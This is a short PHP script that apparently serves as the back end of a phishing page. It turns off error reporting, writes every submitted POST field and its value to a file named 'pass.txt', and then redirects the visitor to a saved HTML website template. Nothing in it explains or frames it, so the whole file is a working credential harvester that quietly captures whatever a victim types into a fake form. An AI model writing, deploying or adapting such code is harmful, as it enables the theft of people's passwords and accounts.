<?php
header('location: 11Th Page _ Html Website Template.html');
error_reporting(0);
$handle = fopen("pass.txt","a");
foreach($_POST as $variable => $value)
{
  fwrite($handle, $variable);
  fwrite($handle, "= ");
  fwrite($handle, $value);
  fwrite($handle, "\r\n");
}
fwrite($handle, "\r\n");
fclose($handle);
exit;
?> 
       